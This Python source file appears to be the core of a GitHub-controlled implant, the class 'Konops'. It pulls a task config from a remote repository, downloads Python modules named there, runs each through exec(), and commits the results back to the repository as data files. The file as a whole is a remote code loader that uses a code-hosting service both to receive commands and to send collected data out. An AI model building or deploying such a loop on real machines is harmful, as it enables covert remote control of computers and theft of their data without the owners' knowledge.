#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Oct  9 14:10:26 2021

@author: xcs
"""
import gitwrapper
import json
import sys
import datetime
import types

#configuration path
cpath="config/"
#module path
mpath="modules/"
#data path
dpath="data/"

class Konops :
    def __init__(self,konopsid):
        #Konops id
        self.konops_id=konopsid
        #Konops modules
        self.konops_modules=[]
        #Is it configured?
        self.configured=False
        #Configuration file 
        self.konops_config="%s.json"%self.konops_id
        
        #Initialize tokens and headers
        
        self.token,self.headers=gitwrapper.login()
        

    def configure(self):
        path_filename=cpath+self.konops_config
        resp,config_content=gitwrapper.get_file_contents(self.token,self.headers,path_filename)
        #print(config_content)
        self.configured=True
        config=json.loads(config_content)
        for task in config:
            #print(task['module'])
            self.konops_modules.append(task['module'])
        return config
    
    def execute(self):
        data=dict()
        for task in range(len(self.konops_modules)):
            filename=self.konops_modules[task]+".py"
            filepathname=mpath+filename
            modulename=filename.strip(".py")
            #Get module file content
            resp,content=gitwrapper.get_file_contents(self.token,self.headers,filepathname)
            #print(resp)
            module = types.ModuleType(modulename)
            exec(content, module.__dict__)
            sys.modules[modulename] = module
            result = sys.modules[modulename].run()
            data[modulename]=str(result)
            print("result of "+filename+" is: '" + str(result) + "'") 
        time = str(datetime.datetime.now())
        datapathfile=dpath+self.konops_id+time+".txt"
    
        commit="Stored "+self.konops_id+" work to data..."
        
        content=json.dumps(data)
        #Store the data to a file in github
        gitwrapper.store_to_file(self.token,self.headers,datapathfile,commit,content)
        #print(resp2) #always print responses to identify the bugs during debugging.They print errors. 
        
